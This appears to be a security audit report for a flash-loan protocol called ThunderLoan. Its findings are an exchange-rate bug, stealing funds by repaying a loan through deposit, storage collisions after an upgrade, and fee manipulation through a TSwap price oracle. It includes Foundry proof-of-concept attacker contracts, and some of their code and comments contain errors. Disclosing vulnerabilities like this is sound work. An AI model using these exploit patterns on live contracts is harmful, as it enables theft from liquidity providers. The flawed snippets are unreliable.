## Highs


### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it it has more fees than it than it really does, which blocks redemption and incorrectly sets the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsbile for calculating the exchange rate between assetTokens and underlying tokens. In a way, its responsible for keeping track of how many fees to give to liquidity providers.

However, the `deposit` function, updates this rate, without collecting any fees!

```javascript
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;

        emit Deposit(msg.sender, token, amount);

        assetToken.mint(msg.sender, mintAmount);

@>        uint256 calculatedFee = getCalculatedFee(token, amount);
@>        assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts to this bug.

1. The `redeem` function is blocked, because the protocol thinks the owed tokens are more than the actual tokens in the protocol.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than deserved.

**Proof of Concept:**

1. LP deposits
2. User takes out a flash loan
3. It is not impossible for LP to redeem.

<details>
<summary>Proof Of Code</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript
 function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines from `deposit`.

```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;

        emit Deposit(msg.sender, token, amount);

        assetToken.mint(msg.sender, mintAmount);

-        uint256 calculatedFee = getCalculatedFee(token, amount);
-        assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] A user can bypass the `ThunderLoan::repay` function and repay a flashloan by calling `ThunderLoan::deposit` which would increase a users liquidity balance and repay his flash loan at the same time, allowing this user to then withdraw liquidity and steal funds.

**Description:** When a user calls the `ThunderLoan::flashLoan` function, they must repay their flashLoan, but the way that is checked is through checking the balance of the token that is loaned in its respective liquidity pool, or `AssetToken` contract. When you call the `ThunderLoan::deposit` function, you also send funds to the `AssetToken` liquidity pool contract, but now you have funds to your name that you can withdraw later on using `ThunderLoan::redeem`. So if you take a flash loan by calling `ThunderLoan::flashLoan` and then you call `ThunderLoan::deposit` using the funds from that flash loan, you are able to hit two birds with one stone, you pay off the flash loan, AND you have liquidity to your name in the `AssetToken` liquidity pool contract that you are allowed to withdraw whenever you want!

**Impact:** The protocol will lose all of its funds to a hacker.

**Proof of Concept:**

The following steps can be taken to preform this attack.

1. User takes a flash loan from `ThunderLoan` for 100 `tokenA`. 

2. The user calls `ThunderLoan::deposit` with 100 `tokenA` and some extra `tokenA` to account for fees. This action pays back the debt and puts some liquidity to the user's name.

3. In a different transaction/block the user calls `ThunderLoan::redeem` and receives the 100 `tokenA` plus some fees he also deposited through step #2 and any additional fees that were collected from other people taking flashloans through `ThunderLoan`. 

```javascript
    function flashloan( ... ){
    .
    .
    .
@>    uint256 endingBalance = token.balanceOf(address(assetToken));
@>        if (endingBalance < startingBalance + fee) {
            revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
        }
    }
```

**Proof of Code:**

<details>

Add the following function and contract to your unit test's.

```solidity

function testUseDepositInsteadOfRepay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();
        
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee );
    }

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    // We want this contract to do the following things:
    // 1. Swap TokenA borrowed for WETH
    // 2. Take out ANOTHER flash loan, to show the difference

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/ // we dont care about either of those params
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(tokenA).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(address(s_token), amount);
    }

}

```
</details>


**Recommended Mitigation:** Add the following code in `ThunderLoan::deposit` to prevent this attack vector.

```diff

contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable {
    error ThunderLoan__NotAllowedToken(IERC20 token);
    error ThunderLoan__CantBeZero();
    error ThunderLoan__NotPaidBack(uint256 expectedEndingBalance, uint256 endingBalance);
    error ThunderLoan__NotEnoughTokenBalance(uint256 startingBalance, uint256 amount);
    error ThunderLoan__CallerIsNotContract();
    error ThunderLoan__AlreadyAllowed();
    error ThunderLoan__ExhangeRateCanOnlyIncrease();
    error ThunderLoan__NotCurrentlyFlashLoaning();
    error ThunderLoan__BadNewFee();
+   error ThunderLoan__NotCurrentlyFlashLoaning();

function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+       if(s_currentlyFlashLoaning[token]){
+           revert ThunderLoan__NotCurrentlyFlashLoaning();
+}
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        .
        .
        .
        }
```
### [H-3] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoan` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol.

**Description:** `ThunderLoan.sol` has two variables in the following order:

```solidity
    uint256 private s_feePrecision; 
    uint256 private s_flashLoanFee;
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order: 

```solidity
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, breaks the storage locations as well.

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee.

More importantly, the `s_currentlyFlashLoaning` mapping with storage is also in the wrong storage slot.

**Proof of Concept:**


<details>
<summary> PoC</summary>  

Place the following into `ThunderLoanTest.t.sol`.

```solidity
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.


```

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`

</details>


**Recommended Mitigation:** If you must remove the storage variable, leave it as blank as to not mess up the storage slots.

```diff
+uint256 private s_emptyStorage;
uint256 private s_flashLoanFee; // 0.3% ETH fee
uint256 public constant FEE_PRECISION = 1e18;
```

## Mediums

### [M-1] Using TSwap as a price oracle, leads to price and oracle manipulation attacks, which lead to lower fee costs than expected.

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). And this type of protocol derives the price of an asset from the ratio of one asset to another in a liquidity pool. Becuase of this fact, if a user takes a huge flash loan, and buys out a large supply of an asset from one of those liquidity pools, he can manipulate the price of the other asset in the liquidity pool, to make it very cheap int this example, and effectively ignore protocol fees.

**Impact:** Liquidity provider for the ThunderLoan protocol will lose out on a lot of fees for providing liquidity.

**Proof of Concept:**

The following all happens in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 100 `tokenA`. They are charged the intial normal fee.

2. Then, they deposit the 100 `tokenA` into the TSwap protocol for weth, which increases the supply of `tokenA` in that pool, and decreases the price of `tokenA` (for example, 1 tokenA = 1 weth before, now 1 tokenA = 0.1 weth.) 

3. Then the user takes another flash loan of 100 `tokenA` and calcuates the fee associated with this second loan. This fee will be cheaper than the intial fee.

4. Pay back the second loan with the extra fee that is lower than the intital fee.

5. Pay back the first loan with the intital fee.

```javascript
function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>        return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
**Proof of Code:**

<details>

Add the following function and contract to your unit test's.

```javascript
function testOracleManipulation() public {
        //1. First set up new contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        // Here we are giving the proxy an implementation address of the logic contract.
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Creating a TSwap DEX for Weth/Token A
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf)); // Initilizing the ThunderLoan contract with the Pool Factory address.
        // 2. Fund TSwap
        // First play the role of the liquidity provider and deposit liquidity.
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        // Deposit Liquidity into TSWAP (not thunderloan) using a liquidity providers
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        // Ratio of Liquidity pool is 100Weth to 100 Token A
        // Price of Token A is 1 Weth
        // 1:1
        vm.stopPrank(); //Stop playing the role of the Liquidity provider
        // Allow token A on thunderloan with owner account
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // 3. Fund ThunderLoan
        // Deposit liquidity into THUNDERLOAN (not TSWAP)
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // Now we have the following balances in the two contracts:
        // TSWAP: 100 Weth, 100 Token A. (Price of Token A is 1 Weth)
        // ThunderLoan: 1000 Token A

        // To manipulate the price of Token A on TSwap, we will do the following:
        // 1. Take a 50 token A flash loan from ThunderLoan
        // 2. Swap the 50 AToken's for Weth on Tswap. (Now the supply of Token A on tswap is 150 which decreases the
        // price.)
        // 3. Take ANOTHER flash loan of 50 Token A from ThunderLoan, and will be cheaper
        // because according to the Tswap oracle, you have a ~80/150 ratio of Weth to Token A
        // means the price of Token A is around 0.5 Weth, and the fee will be cheaper.

        // Get the fee for a normal flash loan of 50 A Token's.
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal fee before price manipulation", normalFeeCost);
        // 0.296147410319118389

        uint256 amountToBorrow = 50e18; // Amount of Token A to flashLoan                                                             //
            // mapping for USDC -> USDC asset token for LP's
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        // 4. We are going to take out 2 flash loans
        //     a. We will do this to first manipulate the price of token A on the TSwap Dex
        //     b. To show that doing so greatly reduces the fees we pay on ThunderLoan
        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console2.log("Attack Fee is: ", attackFee);
        console2.log("Normal Fee is: ", normalFeeCost);
        assert(attackFee < normalFeeCost);
    }


contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    // We want this contract to do the following things:
    // 1. Swap TokenA borrowed for WETH
    // 2. Take out ANOTHER flash loan, to show the difference

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/ // we dont care about either of those params
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. Swap TokenA borrowed for WETH
            // 2. Take out ANOTHER flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            // arg1 : The amount of Token A you want to swap
            // arg2 : Current reserve of Token A in the pool.
            // arg3 : Current reserve of WETH in the pool.
            // Returns: Compute's the expected WETH output for swapping 50 Token A
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // arg1 Amount of TokenA to exchange for weth
            // arg2 Slippage minimum to avoid getting a bad deal
            // arg3 deadline for txn
            // This does the swap and will TANK the price!
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // Now we have a lot of Token A
            // And minimum weth
            // so 1 weth used to be 10 token A
            // but now 1 weth is like 50 token A

            // Second Flash Loan!
            // this will call executeOperation, except attacked is true.
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay first loan
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee
            feeTwo = fee;
            // now repay second loan (THE TRANSFER BELOW RUNS BEFORE THE TRANSFER ABOVE)
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```
</details>


**Recommended Mitigation:** Instead of using the TSwap protocol as a price oracle, consider using a Chainlink Price feed with a Uniswap TWAP (Time-Weighted Average Price) fallback oracle for price info. (A fallback oracle is a backup mechanism if the primary oracle fails or is unavailable.)

